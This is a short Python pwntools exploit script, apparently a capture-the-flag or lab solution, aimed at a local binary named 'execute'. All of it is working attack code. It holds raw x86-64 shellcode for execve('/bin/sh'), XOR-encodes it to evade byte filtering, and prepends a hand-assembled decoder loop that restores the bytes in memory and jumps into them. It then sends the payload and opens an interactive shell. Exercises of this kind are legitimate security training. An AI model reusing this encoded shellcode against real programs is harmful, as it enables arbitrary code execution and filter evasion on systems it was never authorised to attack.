#!/usr/bin/python3
from pwn import process, context, asm

shell = process("./execute")
context.arch = "amd64"

def xor_bytes(shellcode):
    output = bytearray()

    for byte in shellcode:
        xored_byte = byte ^ 0x10
        output.append(xored_byte)

    return output

# execve("/bin/sh", NULL, NULL);
shellcode = b"\x6a\x3b\x58\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x99\x0f\x05"
xored_shellcode = xor_bytes(shellcode)

shellcode  = b""
shellcode += asm("push 0x17")                # counter
shellcode += asm("pop rbx")                  # $rbx = counter
shellcode += asm("lea rsi, [rsp + 0x42]")    # $rsi = shellcode start
shellcode += asm("jmp $+0x19")               # jump xored shellcode
shellcode += xored_shellcode                 # save xored shellcode
shellcode += asm("xor byte ptr [rsi], 0x10") # restore byte
shellcode += asm("dec bl")                   # dec counter
shellcode += asm("inc rsi")                  # inc address
shellcode += asm("cmp bl, bh")               # cmp counter, 0x0
shellcode += asm("jnz $-0xa")                # if zf == 0 -> loop to decode
shellcode += asm("jmp $-0x23")               # if zf == 1 -> exec shellcode

shell.sendafter(b"\n", shellcode)
shell.interactive()
